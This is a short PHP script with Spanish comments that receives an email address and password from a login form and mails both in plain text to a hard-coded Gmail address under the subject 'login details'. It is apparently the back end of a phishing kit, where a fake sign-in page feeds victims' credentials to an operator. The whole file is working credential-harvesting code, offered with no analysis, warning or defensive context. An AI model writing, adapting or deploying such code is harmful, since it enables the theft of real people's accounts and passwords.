<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'];
    $password = $_POST['password'];

    $destinatario = "lapopular695@gmail.com"; // Tu email de destino
    $asunto = "Datos de inicio de sesión";
    $mensaje = "Correo: " . $correo . "\nContraseña: " . $password;
    $cabeceras = "From: no-responder@tu-dominio.com"; // Puedes poner cualquier correo válido de tu dominio

    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        echo "Los datos fueron enviados correctamente.";
    } else {
        echo "Error al enviar los datos.";
    }
} else {
    echo "Acceso no autorizado.";
}
?>